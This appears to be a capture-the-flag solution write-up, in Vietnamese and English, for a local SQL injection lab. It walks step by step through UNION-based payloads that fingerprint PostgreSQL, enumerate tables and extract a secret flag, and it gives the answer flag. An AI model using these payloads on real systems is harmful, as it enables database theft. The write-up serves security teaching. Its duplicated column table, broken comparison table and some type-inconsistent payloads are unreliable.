# SQLi-002 Solution Writeup

## Vulnerability Analysis

Ứng dụng có lỗ hổng SQL Injection trong chức năng filter theo category.

### Vulnerable Code

```python
sql = f"SELECT * FROM articles WHERE category = '{category}'"
```

---

## Step-by-Step Solution

### Step 1: Logic-based Detection

**Test TRUE condition:**

```
GET /articles?category=technology' OR '1'='1
```

**Result:** Hiển thị TẤT CẢ articles (10 bài) thay vì chỉ category technology

**Test FALSE condition:**

```
GET /articles?category=technology' AND '1'='2
```

**Result:** Không hiển thị bài nào (0 articles)

✅ **Confirmed**: Response khác biệt rõ ràng → SQL Injection vulnerable!

---

### Step 1.5: DBMS Fingerprinting (Xác định loại database)

⚠️ **CRITICAL**: Phải biết DBMS trước khi xác định columns/types để chọn syntax đúng!

#### Method 1: Function-based detection

**Test với version() function:**

```
GET /articles?category=' UNION SELECT version()--
```

❌ **Lỗi**: "The used SELECT statements have a different number of columns"

→ Cần đủ số columns! Thử với 1 column visible:

```
GET /articles?category=' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL--
```

✅ **Success!** Hiển thị trong article title:

```
PostgreSQL 15.10 (Debian 15.10-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit
```

#### Method 2: Error-based detection (alternative)

Nếu app hiển thị error messages, có thể test với syntax-specific queries:

```
# PostgreSQL: string concatenation với ||
GET /articles?category=' AND 'a'||'b'='ab'--

# MySQL: string concatenation với CONCAT()
GET /articles?category=' AND CONCAT('a','b')='ab'--
```

PostgreSQL sẽ chấp nhận `||`, MySQL sẽ fail.

✅ **Confirmed**: Database là **PostgreSQL 15.x**

**Tại sao bước này quan trọng?**

- PostgreSQL dùng `NOW()`, MySQL dùng `NOW()` hoặc `CURRENT_TIMESTAMP`
- PostgreSQL strict về type checking trong UNION
- PostgreSQL comment syntax: `--` (cần space) hoặc `/**/`
- Biết DBMS → chọn functions/syntax phù hợp cho các bước tiếp theo!

---

### Step 2: Xác định số columns

**⚠️ Lưu ý**: PostgreSQL có thể khác biệt giữa ORDER BY và UNION SELECT!

#### Method 1: ORDER BY (có thể misleading)

```
GET /articles?category=' ORDER BY 1--
GET /articles?category=' ORDER BY 7--  (Success)
GET /articles?category=' ORDER BY 8--  (No results)
```

→ Có vẻ như 7 columns? **NHƯNG...**

#### Method 2: UNION SELECT NULL (accurate!)

```
GET /articles?category=' UNION SELECT NULL--
GET /articles?category=' UNION SELECT NULL,NULL--
...
GET /articles?category=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--  (Success! ✅)
GET /articles?category=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--  (No results ❌)
```

✅ **Conclusion**: UNION requires exactly **6 columns** (not 7!)

**Lý do:**

- `SELECT * FROM articles` trả về 7 columns (id, title, content, category, author, published_at, views)
- **NHƯNG** template chỉ render 6 columns (bỏ qua column 1 = id)
- PostgreSQL strict về type compatibility trong UNION
- **Always trust UNION SELECT NULL method over ORDER BY!**

---

### Step 3: Identify visible columns và data types

**⚠️ PostgreSQL Challenge**: Strict type checking means:

- Wrong type → "No articles found" (silent failure)
- No error message → Can't see what went wrong
- **Problem**: How to know column types WITHOUT working payload?

#### 3.1. Reverse engineer từ normal response (CRITICAL!)

**First, observe NORMAL article structure:**

```
GET /articles?category=technology
```

**Study HTML output:**

```html
<div class="article-card">
  <h3>New AI Breakthrough in 2024</h3>
  ← Title
  <div class="meta">By John Smith • December 26, 2025 ← Author, Date</div>
  <div class="content">Scientists have discovered a new method...</div>
  ← Content
  <div class="footer">
    <span class="category-tag">technology</span> ← Category
    <span class="views">👁️ 1520 views</span> ← Views (number)
  </div>
</div>
```

**Mapping HTML → Database columns:**

| HTML Element                  | Displayed Data           | Column Position | Type Guess       |
| ----------------------------- | ------------------------ | --------------- | ---------------- |
| `<h3>`                        | "New AI Breakthrough..." | Column ?        | VARCHAR (string) |
| `<div class="content">`       | "Scientists have..."     | Column ?        | TEXT (string)    |
| `<span class="category-tag">` | "technology"             | Column ?        | VARCHAR (string) |
| Author in meta                | "John Smith"             | Column ?        | VARCHAR (string) |
| Date in meta                  | "December 26, 2025"      | Column ?        | TIMESTAMP ⚠️     |
| `<span class="views">`        | "1520" (number)          | Column ?        | INT ⚠️           |

**Common article table pattern:**

```sql
CREATE TABLE articles (
    id INT,              -- Column 1 (not displayed)
    title VARCHAR,       -- Column 2 → <h3>
    content TEXT,        -- Column 3 → <div class="content">
    category VARCHAR,    -- Column 4 → <span class="category-tag">
    author VARCHAR,      -- Column 5 → author in meta
    published_at TIMESTAMP, -- Column 6 → date in meta
    views INT            -- Column 7 → <span class="views">
);
```

But wait! UNION only needs **6 columns** (from Step 2). So column 1 (id) is skipped!

#### 3.2. Verify với NULL method (Safe!)

**NULL is compatible with ANY type:**

```
GET /articles?category='%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL--
```

✅ **Success!** (blank article card appears)

**Now map each position:**

```
# Test column 1 (should be title)
GET /articles?category='%20UNION%20SELECT%20'TEST1',NULL,NULL,NULL,NULL,NULL--
```

**Look at response** → 'TEST1' appears in `<h3>` → Column 1 = title ✅

```
# Test column 2
GET /articles?category='%20UNION%20SELECT%20NULL,'TEST2',NULL,NULL,NULL,NULL--
```

**Look** → 'TEST2' in content → Column 2 = content ✅

**Continue for all 6 columns...**

#### 3.3. Test types systematically

Based on HTML analysis, try:

```
# All strings (will fail on timestamp/int columns)
GET /articles?category='%20UNION%20SELECT%20'a','b','c','d','e','f'--
```

❌ **No results** → Column 5 or 6 không phải string!

**Fix với common types:**

```
# Try: string, string, string, string, TIMESTAMP, INT
GET /articles?category='%20UNION%20SELECT%20'title','content','cat','author',NOW(),100--
```

✅ **Success!** Article card hiển thị!

**Final column structure:**

| Position | Field        | Type      | Test Value                     | HTML Output                   |
| -------- | ------------ | --------- | ------------------------------ | ----------------------------- |
| 1        | title        | VARCHAR   | `'any string'`                 | `<h3>`                        |
| 2        | content      | TEXT      | `'any string'`                 | `<div class="content">`       |
| 3        | category     | VARCHAR   | `'any string'`                 | `<span class="category-tag">` |
| 4        | author       | VARCHAR   | `'any string'`                 | Author in meta                |
| 5        | published_at | TIMESTAMP | `NOW()`                        | Date in meta                  |
| 6        | views        | INT       | `100`                          | `<span class="views">`        |
| 4        | category     | VARCHAR   | `'any string'`                 |
| 5        | author       | VARCHAR   | `'any string'`                 |
| 6        | published_at | TIMESTAMP | `NOW()` or `CURRENT_TIMESTAMP` |
| 7        | views        | INT       | `100`                          |

Wait... 7 columns? **NO!** UNION chỉ cần **6 columns** (skip column 1 = id trong display).

**Corrected:**

```
GET /articles?category='%20UNION%20SELECT%20'title','content','cat','author',NOW(),100--%20
```

---

### Step 4: Extract flag từ secrets table

**Enumerate tables first:**

```
GET /articles?category='%20UNION%20SELECT%201,table_name,'a','a',NOW(),0%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--%20
```

**Found**: `articles`, `users`, `secrets` ← Flag here!

**Enumerate columns của secrets:**

```
GET /articles?category='%20UNION%20SELECT%201,column_name,'a','a',NOW(),0%20FROM%20information_schema.columns%20WHERE%20table_name='secrets'--%20
```

**Found**: `id`, `secret_name`, `secret_value` ← Đây là structure!

**⚠️ Quan trọng**: Sau khi biết columns:

- `secret_name` = tên/key (như 'sqli_002_flag')
- `secret_value` = giá trị thực (là FLAG)

**Extract flag:**

```
GET /articles?category=technology'%20UNION%20SELECT%201,secret_value,'a','a',NOW(),100%20FROM%20secrets--%20
```

✅ **Flag hiển thị trong article title!** (Table chỉ có 1 row nên không cần WHERE)

## Final Payload

```
' UNION SELECT 1,secret_value,'a','a',NOW(),100 FROM secrets--
```

**URL Encoded:**

```
http://localhost:5002/articles?category=technology%27%20UNION%20SELECT%201%2Csecret_value%2C%27a%27%2C%27a%27%2CNOW%28%29%2C100%20FROM%20secrets--
```

---

## Flag

```
FLAG{l0g1c_b4s3d_d3t3ct10n_p0stgr3sql}
```

---

## Key Learnings

1. **Quy trình đúng**: Detect SQLi → **Identify DBMS** → Column count → Column types → Extract data
2. **DBMS Fingerprinting sớm**: Dùng `version()` function ngay sau khi confirm SQLi để biết database type
3. **Logic-based testing** không cần error messages để detect SQLi
4. So sánh **TRUE** vs **FALSE** responses là kỹ thuật quan trọng
5. **ORDER BY vs UNION mismatch**:
   - ORDER BY có thể report 7 columns
   - UNION chỉ accept 6 columns (vì template skip column 1)
   - **Always verify with UNION SELECT NULL method!**
6. **PostgreSQL type strictness**:
   - TIMESTAMP columns require `NOW()` or `CURRENT_TIMESTAMP`
   - Cannot use string for timestamp like `'2024-01-01'` without casting
   - INT columns require numbers, not strings
7. **Biết DBMS giúp chọn syntax đúng**:
   - PostgreSQL: `NOW()`, `||`, `version()`
   - MySQL: `NOW()`, `CONCAT()`, `version()`
   - MSSQL: `GETDATE()`, `+`, `@@version`
8. **HTML reverse engineering**: Phân tích normal response để đoán column types trước khi test
9. PostgreSQL sử dụng `--` cho comments (giống MySQL)
10. Có thể detect SQLi ngay cả khi app hide error messages

## PostgreSQL vs MySQL Differences

| Feature           | PostgreSQL | MySQL       |
| ----------------- | ---------- | ----------- | --- | ------------------- |
| String concat     | `          |             | `   | `CONCAT()` or space |
| Current timestamp | `NOW()`    | `NOW()`     |
| Comments          | `--`       | `--` or `#` |
| Type casting      | `::type`   | `CAST()`    |
